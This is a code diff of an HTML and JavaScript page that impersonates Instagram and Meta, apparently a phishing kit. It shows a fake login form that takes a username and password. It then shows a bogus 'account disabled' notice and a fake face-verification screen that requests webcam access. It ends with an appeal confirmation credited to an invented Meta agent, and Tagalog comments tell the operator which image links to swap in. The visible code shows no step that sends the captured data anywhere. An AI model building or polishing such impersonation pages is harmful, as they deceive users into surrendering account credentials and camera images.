@@ -14,7 +14,6 @@
 
 body {
   background: #ffffff;
-  color: #000000;
   min-height: 100vh;
 }
 
@@ -22,7 +21,6 @@ body {
   display: none !important;
 }
 
-/* === WHITE FLASH EFFECT === */
 .flash-screen {
   position: fixed;
   top: 0;
@@ -39,471 +37,388 @@ body {
   opacity: 1;
 }
 
-/* === PAGE WRAPPER === */
 .page {
   width: 100%;
-  max-width: 480px;
+  max-width: 400px;
   margin: 0 auto;
-  padding: 16px 24px 60px;
-  background: #ffffff;
+  padding: 40px 24px;
   min-height: 100vh;
 }
 
-/* === HEADER === */
-.header {
-  width: 100%;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 12px 0 32px;
-  border-bottom: 1px solid #e6e6e6;
-}
-
-.header-logo {
-  font-family: 'Segoe Script', 'Brush Script MT', cursive;
-  font-size: 28px;
-  color: #000000;
-}
-
-.header-menu {
-  font-size: 26px;
-  color: #000000;
-  line-height: 1;
-}
-
-/* ===================================== */
-/* PAGE 1: LOGIN */
-/* ===================================== */
-.language-select {
-  font-size: 15px;
-  color: #555;
+.lang {
   text-align: center;
-  padding: 12px 0 60px;
+  font-size: 15px;
+  color: #666;
+  margin-bottom: 40px;
 }
 
-.ig-logo {
-  width: 96px;
-  height: 96px;
-  margin: 0 auto 48px;
+.logo {
+  width: 80px;
+  height: 80px;
+  margin: 0 auto 40px;
 }
-
-.ig-logo img {
+.logo img {
   width: 100%;
-  height: 100%;
-  object-fit: contain;
+  height: auto;
 }
 
 .form-container {
-  width: 100%;
-  max-width: 350px;
-  margin: 0 auto;
   display: flex;
   flex-direction: column;
   gap: 12px;
 }
 
 .input-field {
-  width: 100%;
   padding: 14px 12px;
   border: 1px solid #dbdbdb;
   border-radius: 8px;
-  font-size: 14px;
+  font-size: 15px;
   background: #fafafa;
   outline: none;
 }
-
 .input-field::placeholder {
-  color: #8e8e8e;
+  color: #999;
 }
 
 .login-btn {
-  width: 100%;
+  padding: 13px;
   background: #0095f6;
-  color: #ffffff;
+  color: #fff;
   border: none;
   border-radius: 8px;
-  font-size: 15px;
+  font-size: 16px;
   font-weight: 600;
-  padding: 12px;
-  margin-top: 8px;
   cursor: pointer;
+  margin-top: 6px;
 }
 
-.forgot-link {
+.forgot {
   text-align: center;
-  margin-top: 16px;
-  font-size: 15px;
+  margin-top: 20px;
 }
-
-.forgot-link a {
+.forgot a {
   color: #00376b;
   text-decoration: none;
+  font-size: 15px;
 }
 
 .create-btn {
+  margin-top: 50px;
   width: 100%;
-  background: #ffffff;
+  padding: 13px;
+  background: #fff;
   color: #0095f6;
   border: 1px solid #0095f6;
   border-radius: 8px;
-  font-size: 15px;
+  font-size: 16px;
   font-weight: 600;
-  padding: 12px;
-  margin-top: 60px;
   cursor: pointer;
 }
 
-.meta-brand {
+.meta {
+  text-align: center;
+  margin-top: 70px;
+}
+.meta img {
+  width: 70px;
+}
+
+/* === Other Pages === */
+.header {
   display: flex;
+  justify-content: space-between;
   align-items: center;
-  justify-content: center;
-  margin-top: 60px;
+  padding: 12px 0 32px;
+  border-bottom: 1px solid #e6e6e6;
+}
+.header-logo {
+  font-size: 24px;
+  font-weight: 600;
 }
 
-.meta-brand img {
-  width: 58px;
-  height: auto;
-}
-
-/* ===================================== */
-/* PAGE 2: ACCOUNT DISABLED */
-/* ===================================== */
 .content {
-  width: 100%;
-}
-
-.profile-img {
-  width: 80px;
-  height: 80px;
-  border-radius: 50%;
-  background: #ddd;
-  margin: 0 auto 24px;
-  overflow: hidden;
-}
-
-.profile-img img {
-  width: 100%;
-  height: 100%;
-  object-fit: cover;
+  padding-top: 20px;
 }
 
 h1 {
   font-size: 22px;
   font-weight: 600;
-  color: #000;
-  margin-bottom: 8px;
   text-align: center;
+  margin-bottom: 10px;
+}
+
+.username-display {
+  text-align: center;
+  color: #0095f6;
+  font-size: 18px;
+  margin-bottom: 5px;
 }
 
 .subtitle {
-  font-size: 15px;
-  color: #333;
-  margin-bottom: 6px;
   text-align: center;
+  color: #666;
+  font-size: 15px;
+  margin-bottom: 5px;
 }
 
 .date-line {
-  font-size: 13px;
-  color: #737373;
-  margin-bottom: 40px;
   text-align: center;
+  color: #999;
+  font-size: 13px;
+  margin-bottom: 40px;
 }
 
 h2 {
   font-size: 18px;
   font-weight: 600;
-  color: #000000;
-  margin: 40px 0 16px;
+  margin: 30px 0 12px;
 }
 
 p {
   font-size: 16px;
-  line-height: 1.5;
-  color: #262626;
-  margin-bottom: 12px;
+  line-height: 1.6;
+  margin-bottom: 10px;
+  color: #333;
 }
 
 .link-row {
   display: flex;
   align-items: center;
-  color: #00376b;
-  font-size: 15px;
-  margin-top: 4px;
   gap: 8px;
+  color: #00376b;
   text-decoration: none;
+  margin: 10px 0;
 }
 
 .download-link {
   color: #00376b;
-  text-decoration: none;
+}
+
+.btn-logout, .btn-appeal {
+  width: 100%;
+  padding: 13px;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  border: none;
+  margin-top: 12px;
 }
 
 .btn-logout {
-  width: 100%;
   background: #0095f6;
   color: #fff;
-  border: none;
-  border-radius: 8px;
-  font-size: 15px;
-  font-weight: 600;
-  padding: 12px;
-  margin-top: 30px;
-  cursor: pointer;
 }
 
 .btn-appeal {
-  width: 100%;
-  background: #ffffff;
+  background: #fff;
   color: #0095f6;
   border: 1px solid #0095f6;
-  border-radius: 8px;
-  font-size: 15px;
-  font-weight: 600;
-  padding: 12px;
-  margin-top: 16px;
-  cursor: pointer;
 }
 
-/* ===================================== */
-/* PAGE 3: FACE VERIFICATION */
-/* ===================================== */
+/* === Camera === */
 .camera-box {
   width: 100%;
-  max-width: 350px;
+  max-width: 320px;
   aspect-ratio: 4/5;
-  background: #f5f5f5;
+  background: #f0f0f0;
   border-radius: 12px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
   margin: 20px auto;
   overflow: hidden;
   position: relative;
+  border: 2px solid #ddd;
 }
-
 .camera-box video {
   width: 100%;
   height: 100%;
   object-fit: cover;
-  display: none;
+  transform: scaleX(1);
 }
-
-.camera-box video.active {
-  display: block;
-}
-
 .camera-placeholder {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
   text-align: center;
-  color: #888;
-  font-size: 16px;
+  color: #666;
 }
 
 .camera-hint {
   text-align: center;
-  font-size: 15px;
   color: #666;
-  margin-bottom: 30px;
+  margin-bottom: 20px;
 }
 
 .btn-verify {
   width: 100%;
+  padding: 13px;
   background: #0095f6;
   color: #fff;
   border: none;
   border-radius: 8px;
-  font-size: 15px;
+  font-size: 16px;
   font-weight: 600;
-  padding: 12px;
   cursor: pointer;
+  margin-top: 10px;
 }
-
 .btn-verify:disabled {
-  background: #b4d9f9;
+  background: #b4d9f6;
   cursor: not-allowed;
 }
 
 .status-text {
   text-align: center;
-  margin-top: 20px;
-  font-size: 15px;
+  margin-top: 15px;
   color: #333;
 }
 
-/* ===================================== */
-/* PAGE 4: APPEAL SUBMITTED */
-/* ===================================== */
+/* === Appeal Submitted === */
 .clock-icon {
   text-align: center;
-  margin: 40px 0;
+  margin: 30px 0;
 }
-
 .clock-icon svg {
-  width: 96px;
-  height: 96px;
+  width: 80px;
+  height: 80px;
 }
 
 .appeal-title {
-  font-size: 32px;
+  font-size: 22px;
   font-weight: 700;
-  color: #000000;
   text-align: center;
-  line-height: 1.2;
-  margin-bottom: 24px;
+  margin-bottom: 20px;
+  line-height: 1.4;
 }
 
 .text-block {
-  font-size: 16px;
-  line-height: 1.5;
-  color: #262626;
-  margin-bottom: 16px;
+  font-size: 15px;
+  line-height: 1.6;
+  margin-bottom: 12px;
+  color: #444;
+}
+.text-block.secondary {
+  color: #888;
 }
 
-.text-block.secondary {
-  color: #737373;
+.agent-note {
+  background: #f0f7ff;
+  color: #0066cc;
+  padding: 12px 16px;
+  border-radius: 8px;
+  text-align: center;
+  margin: 20px 0;
+  font-size: 15px;
 }
 </style>
 </head>
 <body>
 
-<!-- WHITE FLASH -->
 <div class="flash-screen" id="flash"></div>
 
-<!-- ===================================== -->
 <!-- PAGE 1: LOGIN -->
-<!-- ===================================== -->
 <div class="page" id="login-page">
-  <div class="language-select">English (US) ▾</div>
-
-  <div class="ig-logo">
-    <!-- ✅ PALITAN NG IMGUR LINK: Hanapin ang link na nagsisimula sa https://i.imgur.com/... -->
-    <img src="https://i.imgur.com/vdjln8Q.png"
-      alt="Instagram Logo"> 
+  <div class="lang">English (US) ▾</div>
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
   </div>
-
   <div class="form-container">
     <input type="text" class="input-field" placeholder="Username, email or mobile number" id="username">
     <input type="password" class="input-field" placeholder="Password" id="password">
     <button class="login-btn" onclick="goToDisabled()">Log in</button>
-    <div class="forgot-link"><a href="#">Forgot password?</a></div>
   </div>
-
-  <button class="create-btn">Create new account</button>
-
-  <div class="meta-brand">
+  <div class="forgot"><a href="#">Forgot password?</a></div>
+  <button class="create-btn" onclick="goToDisabled()">Create new account</button>
+  <div class="meta">
     <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta">
   </div>
 </div>
 
-<!-- ===================================== -->
 <!-- PAGE 2: ACCOUNT DISABLED -->
-<!-- ===================================== -->
 <div class="page hidden" id="disabled-page">
   <div class="header">
     <div class="header-logo">Instagram</div>
-    <div class="header-menu">☰</div>
+    <div>☰</div>
   </div>
-
   <div class="content">
-    <div class="profile-img">
-      <!-- ✅ PALITAN NG IMGUR LINK: Hanapin ang link na nagsisimula sa https://i.imgur.com/... -->
-      <img src="https://i.imgur.com/REPLACE_PROFILE_LINK_DITO.jpg" alt="Profile">
-    </div>
-
     <h1>We've disabled your account</h1>
-    <p class="subtitle">You no longer have access to your_username</p>
-    <p class="date-line">Account disabled on 24 April 2025</p>
+    <div class="username-display" id="show-username">your_username</div>
+    <p class="subtitle">You no longer have access to this account</p>
+    <p class="date-line">Account disabled on November 24, 2026</p>
 
     <h2>Why this happened</h2>
-    <p>We've reviewed your account and found that it still doesn't follow our Community Standards on account integrity.</p>
-    <a href="#" class="link-row">
-      <span>📄</span>
-      <span>Read more about this rule</span>
-    </a>
+    <p>We found that your account may not have followed our Community Standards, including our guidelines on harassment, misinformation, or inauthentic behavior.</p>
+    <a href="#" class="link-row">📄 Read more about our standards</a>
 
     <h2>What this means</h2>
-    <p>No one can see or find your account and you can't use it. All your information will be permanently deleted.</p>
-    <p>You cannot request another review of this decision.</p>
+    <p>No one can see or access your account right now. If we determine your account should be restored, you'll be able to log in again.</p>
 
     <h2>What you can do</h2>
-    <p>You can <a href="#" class="download-link">download your information</a> so that you have a copy of what you shared on Instagram.</p>
+    <p>You can <a href="#" class="download-link">download your information</a> before your account is permanently removed.</p>
 
-    <h2>More information</h2>
-
-    <button class="btn-appeal" onclick="goToVerify()">Request another review</button>
-    <button class="btn-logout">Log out</button>
+    <button class="btn-appeal" onclick="goToVerify()">Request Review</button>
+    <button class="btn-logout" onclick="goBackLogin()">Log out</button>
   </div>
 </div>
 
-<!-- ===================================== -->
 <!-- PAGE 3: FACE VERIFICATION -->
-<!-- ===================================== -->
 <div class="page hidden" id="verify-page">
   <div class="header">
     <div class="header-logo">Instagram</div>
-    <div class="header-menu">☰</div>
+    <div>☰</div>
   </div>
-
   <div class="content">
-    <h1 style="font-size: 20px; margin-bottom: 8px;">Verify your identity</h1>
+    <h1>Verify your identity</h1>
     <p class="camera-hint">Position your face inside the frame</p>
-
+    
     <div class="camera-box" id="camera-preview">
       <video id="camera-video" autoplay playsinline muted></video>
       <div class="camera-placeholder" id="camera-placeholder">📷 Click below to allow camera access</div>
     </div>
-
+    
     <button class="btn-verify" id="camera-btn" onclick="startCamera()">Allow Camera</button>
     <button class="btn-verify hidden" id="verify-btn" onclick="verifyFace()">Start Verification</button>
     <p class="status-text" id="verify-status"></p>
   </div>
 </div>
 
-<!-- ===================================== -->
 <!-- PAGE 4: APPEAL SUBMITTED -->
-<!-- ===================================== -->
 <div class="page hidden" id="submitted-page">
   <div class="header">
     <div class="header-logo">Instagram</div>
-    <div class="header-menu">☰</div>
+    <div>☰</div>
   </div>
-
   <div class="content">
     <div class="clock-icon">
-      <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <line x1="50" y1="15" x2="50" y2="22" stroke="#515BD4" stroke-width="2" stroke-linecap="round"/>
-        <line x1="67" y1="19" x2="63" y2="25" stroke="#8134AF" stroke-width="2" stroke-linecap="round"/>
-        <line x1="81" y1="33" x2="74" y2="36" stroke="#DD2A7B" stroke-width="2" stroke-linecap="round"/>
-        <line x1="85" y1="50" x2="78" y2="50" stroke="#F58529" stroke-width="2" stroke-linecap="round"/>
-        <line x1="81" y1="67" x2="74" y2="64" stroke="#FEDA77" stroke-width="2" stroke-linecap="round"/>
-        <line x1="67" y1="81" x2="63" y2="75" stroke="#F58529" stroke-width="2" stroke-linecap="round"/>
-        <line x1="50" y1="85" x2="50" y2="78" stroke="#DD2A7B" stroke-width="2" stroke-linecap="round"/>
-        <line x1="33" y1="81" x2="37" y2="75" stroke="#8134AF" stroke-width="2" stroke-linecap="round"/>
-        <line x1="19" y1="67" x2="26" y2="64" stroke="#515BD4" stroke-width="2" stroke-linecap="round"/>
-        <line x1="15" y1="50" x2="22" y2="50" stroke="#DD2A7B" stroke-width="2" stroke-linecap="round"/>
-        <line x1="19" y1="33" x2="26" y2="36" stroke="#F58529" stroke-width="2" stroke-linecap="round"/>
-        <line x1="33" y1="19" x2="37" y2="25" stroke="#FEDA77" stroke-width="2" stroke-linecap="round"/>
-        <circle cx="50" cy="50" r="24" stroke="#000000" stroke-width="2" fill="white"/>
-        <circle cx="50" cy="50" r="3" fill="#000000"/>
-        <line x1="50" y1="50" x2="50" y2="32" stroke="#000000" stroke-width="2.5" stroke-linecap="round"/>
-        <line x1="50" y1="50" x2="62" y2="38" stroke="#000000" stroke-width="2.5" stroke-linecap="round"/>
+      <svg viewBox="0 0 100 100" fill="none">
+        <circle cx="50" cy="50" r="35" stroke="#000" stroke-width="2" fill="none"/>
+        <circle cx="50" cy="50" r="3" fill="#000"/>
+        <line x1="50" y1="50" x2="50" y2="32" stroke="#000" stroke-width="2.5" stroke-linecap="round"/>
+        <line x1="50" y1="50" x2="66" y2="44" stroke="#000" stroke-width="2.5" stroke-linecap="round"/>
       </svg>
     </div>
-
-    <h1 class="appeal-title">You submitted an appeal on<br><span id="appeal-datetime">July 9, 2025</span></h1>
-
-    <p class="text-block">It usually takes us just over a day to review your information. Check back here.</p>
-    <p class="text-block secondary">Your account is not visible to people on Instagram, and you can't use it.</p>
-
+    
+    <h2 class="appeal-title">You submitted an appeal on<br><span id="appeal-datetime"></span></h2>
+    
+    <p class="text-block">It usually takes about 24 hours to review your information. Please check back later.</p>
+    <p class="text-block secondary">Your account is currently not visible to others.</p>
+    
+    <div class="agent-note">Reviewed by Rex Hernandez — Meta Services Agent</div>
+    
     <h2>What happens next?</h2>
-
-    <p class="text-block">We'll take another look at your account.</p>
-    <p class="text-block">If we find your account does follow our Community Standards, you'll be able to use Instagram again.</p>
-    <p class="text-block">If we find your account doesn't follow our Community Standards, it will be permanently disabled and you won't be able to appeal again.</p>
+    <p class="text-block">We'll review the information you submitted.</p>
+    <p class="text-block">If we find your account follows our standards, you'll be able to use Instagram again soon.</p>
+    <p class="text-block">If not, your account will be permanently disabled and you won't be able to appeal again.</p>
   </div>
 </div>
 
 <script>
 let appealDateTime = '';
+
+function getUsername() {
+  const val = document.getElementById('username').value.trim();
+  if (!val) return 'your_username';
+  return val.includes('@') ? val.split('@')[0] : val;
+}
 
 function showFlash(callback) {
   const flash = document.getElementById('flash');
@@ -518,8 +433,15 @@ function goToDisabled() {
   showFlash(() => {
     document.getElementById('login-page').classList.add('hidden');
     document.getElementById('disabled-page').classList.remove('hidden');
+    document.getElementById('show-username').textContent = getUsername();
     window.scrollTo(0, 0);
   });
+}
+
+function goBackLogin() {
+  document.getElementById('disabled-page').classList.add('hidden');
+  document.getElementById('login-page').classList.remove('hidden');
+  window.scrollTo(0, 0);
 }
 
 function goToVerify() {
@@ -536,19 +458,18 @@ async function startCamera() {
     const placeholder = document.getElementById('camera-placeholder');
     const cameraBtn = document.getElementById('camera-btn');
     const verifyBtn = document.getElementById('verify-btn');
-    
+
     placeholder.textContent = 'Requesting camera access...';
-    
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: 'user', width: 400, height: 500 } 
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: 400, height: 500 }
     });
-    
+
     video.srcObject = stream;
-    video.classList.add('active');
-    placeholder.classList.add('hidden');
+    placeholder.style.display = 'none';
     cameraBtn.classList.add('hidden');
     verifyBtn.classList.remove('hidden');
-    
+
   } catch (err) {
     console.error('Camera error:', err);
     alert('Camera access denied. Please allow camera access and try again.');
@@ -557,8 +478,7 @@ async function startCamera() {
 }
 
 function formatDate(date) {
-  const months = ['January', 'February', 'March', 'April', 'May', 'June', 
-                  'July', 'August', 'September', 'October', 'November', 'December'];
+  const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
   const d = date.getDate();
   const m = months[date.getMonth()];
   const y = date.getFullYear();
@@ -573,12 +493,12 @@ function formatDate(date) {
 function verifyFace() {
   const status = document.getElementById('verify-status');
   status.textContent = 'Scanning face...';
-  
+
   setTimeout(() => {
     status.textContent = '✅ Face verified successfully!';
     appealDateTime = formatDate(new Date());
     document.getElementById('appeal-datetime').textContent = appealDateTime;
-    
+
     setTimeout(() => {
       showFlash(() => {
         document.getElementById('verify-page').classList.add('hidden');
